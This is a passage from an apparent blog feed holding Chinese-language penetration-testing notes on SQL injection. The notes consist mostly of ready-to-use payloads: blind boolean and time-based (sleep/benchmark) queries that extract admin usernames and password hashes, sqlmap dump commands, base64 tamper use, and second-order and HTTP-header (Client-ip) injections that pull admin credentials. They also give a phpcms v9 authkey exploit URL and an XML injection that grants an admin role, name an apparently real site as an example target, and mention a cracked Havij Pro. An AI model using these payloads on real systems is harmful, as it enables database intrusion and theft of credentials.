c:\2.txt2%&apos;and(select count(*)from mssysaccessobjects)&gt;0 and &apos;%&apos;=&apos; //返回正常. access数据库2%&apos;and(select count(*)from admin_user)&gt;0 and &apos;%&apos;=&apos; //返回正常的话. 说明存在admin_user表2%&apos;and(select count(username)from admin_user)&gt;0 and &apos;%&apos;=&apos; //返回正常的话. 说明存在username字段2%&apos;and(select top 1 len(admin)from admin_user)&gt;4 and &apos;%&apos;=&apos; //返回正常的话. 说明username长度&gt;42%&apos;and(select top 1 len(username)from admin_user)=5 and &apos;%&apos;=&apos; //返回正常的话. 说明username长度=52%&apos;and(select top 1 len(password)from admin_user)=16 and &apos;%&apos;=&apos; //返回错误,看来密码不是16位md5加密的,或者没加密,32位加密或者更高2010%&apos;and(select top 1 len(password)from admin_user)=32 and &apos;%&apos;=&apos;//返回正常,说明应该是32位加密以下都是对应位置的ascii的编码,如果不是则返回错误2%&apos;and(select top 1 asc(mid(password,1,1))from admin_user)=55 and &apos;%&apos;=&apos;如果是:2010%&apos;and(select top 1 asc(mid(password,1,1))from admin_user)=48 and &apos;%&apos;=&apos;//返回错误,因为password字段第一个 字母ascii编码不是48,而是55.所以返回结果不同搜索型注入burpsuitesqlmap1.先使用burp抓包,保存在1.txt文件里sqlmap -r 1.txt --tablessqlmap -r 1.txt --columns -T &quot;admin&quot;sqlmap -r 1.txt --C &quot;admin.password&quot; -T &quot;manager&quot; --dump -v 2  //列内容其他注入:伪静态注入延迟注入base64注入二阶注入Phpv9 authkey注入HTTP头注入XML实体注入伪静态注入:http://zcb.sxjgjt.com.cn/http://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131.htmlhttp://zcb.sxjgjt.com.cn/index.php/Index/Ndetails/class/news/htmls/moving/id/1131在.html前面写注入(phpweb也是伪静态,不加html也能访问)(它也可以伪造成这样的)延迟注入:延迟注入是通过页面返回的时间来判断的不同的mysql数据库版本,延迟注入语句也不同mysql&gt;=5.0的可以使用sleep()进行查询mysql&lt;5.0的可以使用benchmark()进行查询benchmark用法benchmark(n,sql语句)n为查询次数通过查询次数增多时间变得缓慢来判断是否存在延迟select benchmark(1000,select * from admin);?id=1 and sleep(5)sleep()延迟注入用法sleep可以强制产生一个固定的延迟sleep()延迟注入核心原理and if(true,sleep(5),0); ==IF(1=1,true,false);id=1 and sleep(5) 判断下是否存在延迟注入and if(substring(user(),1,4)=&apos;root&apos;,sleep(5),1)判断当前用户and if(MID(version(),1,1) LIKE 5,sleep(5),1)判断数据库版本信息是否为5可以去猜解他的数据库名称and if(ascii(substring(database(),1,4))&gt;100,sleep(5),1)sqlmap --time-sec 延迟注入base64编码注入:解码$id=base64_decode($id);构造语句编码$id=base64_encode($id);id=1返回错误,对1进行base64编码sqlmap要用插件来跑,tamper-&gt;base64encode.pysqlmap.py -u &quot;http://xxx?id=1&quot; --tamper &quot;base64encode.py&quot;二阶注入:SQL注入一般可分为两种,一阶注入(普通的SQL注入)和二阶SQL注入.一阶SQL注入发生在一个HTTP请求和响应中,系统对攻击输入立即反应执行.一阶注入的攻击过程归纳如下:1.攻击者在HTTP请求中提交恶意sql语句2.应用处理恶意输入,使用恶意输入动态构建SQL语句3.如果攻击实现,在响应中向攻击者返回结构二阶注入,作为sql注入的一种,他不同于普通的SQL注入,恶意代码被注入到web应用中不立即执行,而是存储到后端数据库,在处理另一次不同请求时,应用检索到数据库中的恶意输入并利用它动态构建SQL语句,实现了攻击二阶SQL注入的攻击过程归纳如下:1.攻击者在一个HTTP请求中提交恶意输入2.用于将恶意输入保存在数据库中3.攻击者提交第二个HTTP请求4.为处理第二个HTTP请求,应用检索存储在后端数据库中的恶意输入,动态构建SQL语句5.如果攻击实现,在第二个请求的响应中向攻击者返回结果..测试站点:74cms人才系统简历填写中存在二阶注入 aa&apos;,&apos;fullname&apos;=user()#注册的时候可能会存在二阶注入,存放在数据库中,当你再访问信息的时候,会出现数据库用户名密码phpv9 authkey注入利用exp爆出authkey(可以是百度搜索phpv9 authkey,然后随便找一个漏洞注入)(域名必须一致,才能使用)phpsso_server/index.php?m=phpsso&amp;c=index&amp;a=getapplist&amp;auth_data=v=1&amp;appid=1&amp;data=662dCAZSAwgFUIUJBAxbVQJXVghTWVQHVFMEV1MRX11cBFMKBFMGHkUROlhBTVFuW1FJBAUVBwlXRlgeERUHQVl|UVJAAO|RXABSQEwNXAhZV|5V然后本地构造注入页面进行注入找到&quot;authkey&quot;复制一段百度搜的那个的第二段代码单独放在一个.php中,修改url和authkey访问这个.php?id=1放在sqlmap跑Havij Pro(将破解文件放入之后,不用点注册就进去了)跑phpv9HTTP头注入常见的http请求中存在注入的参数User-agentRefererX-Forwarded-Forclient_ip发现方法:burp抓包添加污染参数火狐插件:modify headerstamper dataPOST/uploads/comment.php?act=send HTTP/1.1Host:127.0.0.1User-Agent:Mozilla/5.0 (Windows NT 6.1;WOW64;rv:18.0)Gecko/20100101 Firefox/18.0Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language:zh-cn;zh;q=0.8;en-us;q=0.5,en;q=0.3Accept-Encoding:gzip,defalteCookie:PHPSESSID=caiu1hm6vu2mp9...Client_ip:1&apos;Connection:keep-aliveContent-Type:application/x-www-form-url...Content-Length:63mood=6&amp;comment=test&amp;id=1&amp;type=1&amp;submit=%CC%E1%BD%BB%C6%C0%C2%DBburp-&gt;repeater-&gt;raw-&gt;添加 X-Forwarded-For:1.1.1.Client-ip:1&apos;MantraModify插件加入进去 --左边第二个,搜索modifyHTTP头注入exp构造分析INSERT INTO blue_comment(com_id,post_id,user_id,tyoe,mood,content,pub_date,ip,is_check) VALUES(&apos;&apos;,&apos;1&apos;,&apos;0&apos;,&apos;6&apos;,&apos;test&apos;,&apos;1480988752&apos;,&apos;111&apos;&apos;,&apos;1&apos;)将111替换成-&gt; a&apos;,&apos;xxx&apos;),(&apos;&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;2&apos;,(select concat(admin_name,0x3a,pwd) from blue_admin limit 0,1),&apos;1645457407&apos;,&apos;sss&apos;,&apos;1&apos;)#XML实体注入可扩展标记语言,标准通用标记语言的子集,是一种用于标记电子文件使其具有结构性的标记语言.在电子计算机中,标记指计算机所能理解的信号符号,通过此种标记,计算机之间可以处理包含各种的信息比如文章等.它可以用来标记数据,定义数据类型,是一种允许用户对自己的标记语言来进行定义的源语言.它非常适合万维网传输,提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据.是Internet环境中跨平台的,依赖于内容的技术,也是当今处理分布式结构信息的有效工具.早在1998年,W3C就发布了XML1.0规范,使用它来简化Internet的文档信息传输.reg:&lt;?php&lt;USER role=user_role&gt;\n&lt;name&gt;&quot;.$username.&quot;&lt;/name&gt;\n&lt;pass&gt;&quot;.$password.&quot;&lt;/pass&gt;\n&lt;/USER&gt;&quot;;?&gt;在前台输入账户密码的密码时这样输入:amdin&lt;/pass&gt;&lt;/USER&gt;&lt;USER role=&quot;admin_role&quot;&gt;&lt;name&gt;cracer&lt;/name&gt;&lt;pass&gt;123456(reg:正方)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;其他注入类型

提交方式注入
参数型注入
其他注入


常见的提交方式:
GET    后面有?id=  这种形式的
POST    
COOKIE
HEAD
PUT
OPTION
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="技能" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/"/>
    
      <category term="编程" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="后端" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/"/>
    
      <category term="基础" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="笔记" scheme="prayer007007.github.io/categories/%E6%8A%80%E8%83%BD/%E7%BC%96%E7%A8%8B/%E5%90%8E%E7%AB%AF/%E6%B8%97%E9%80%8F/%E5%9F%BA%E7%A1%80/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="prayer007007.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="编程" scheme="prayer007007.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="渗透" scheme="prayer007007.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
</feed>
